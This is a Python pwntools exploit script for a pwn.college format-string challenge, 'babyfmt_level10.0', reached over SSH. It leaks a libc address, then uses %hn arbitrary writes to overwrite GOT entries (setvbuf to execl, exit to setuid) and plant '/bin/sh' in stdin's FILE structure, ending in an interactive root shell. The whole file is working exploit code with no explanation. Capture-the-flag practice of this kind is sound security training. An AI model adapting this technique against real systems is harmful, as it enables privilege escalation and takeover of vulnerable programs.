from pwn import p64,u64
from pwn import *
context.binary=e=ELF("./babyfmt_level10.0")
libc=e.libc
gs="""
b *func+412
"""
if args.DEBUG:
    context.log_level="debug"
if args.LOCAL:
    p=e.process()
    if args.GDB:
        gdb.attach(p,gs)
        pause()
elif args.SSH:
    s=ssh(host="dojo.pwn.college",user="hacker",keyfile="~/pwn_college/key",ignore_config=True)
    p=s.process("/challenge/babyfmt_level10.0")
payload1=f"%{ (e.sym.func-85) & 0xffff}c%66$hnlmao%1$p".encode()
payload1+=b"X"*(0x20-5-len(payload1))
payload1+=p64(0x404068)
p.sendlineafter(b"After receiving your input, the program will run printf on your input and then exit.\n",
payload1)
p.recvuntil(b"lmao0x")
leak=int(p.recv(12),16)
libc.address=leak-(libc.sym._IO_2_1_stdout_+131)
log.info(f"libc @ {hex(libc.address)}")
def overwrite_addr(addr, value,writebytes=6):
    write1 = value & 0xffff
    write2 = (value >> 16) & 0xffff
    write3 = (value >> 32) & 0xffff
    writes={
        write1: addr,
        write2: addr+2,
        write3: addr+4,
    }
    write_list=[write1,write2,write3]
    if writebytes==8:
        write4 = (value >> 48) & 0xffff
        writes[write4]=addr+6
        write_list.append(write4)
    write_list.sort()
    payload =f"%{write_list[0]-85}c%73$hn".encode()
    for i in range(1,len(write_list)):
        payload+=f"%{write_list[i]-write_list[i-1]}c%{73+i}$hn".encode()
    payload+=b"X"*(0x53-len(payload))
    for i in range(len(write_list)):
        payload+=p64(writes[write_list[i]])
    p.sendlineafter(b"After receiving your input, the program will run printf on your input and then exit.\n",
    payload)
overwrite_addr(e.got.setvbuf,libc.sym.execl)
overwrite_addr(libc.sym._IO_2_1_stdin_,u64(b"/bin/sh\x00"),writebytes=8)
overwrite_addr(e.got.exit,libc.sym.setuid)
p.interactive()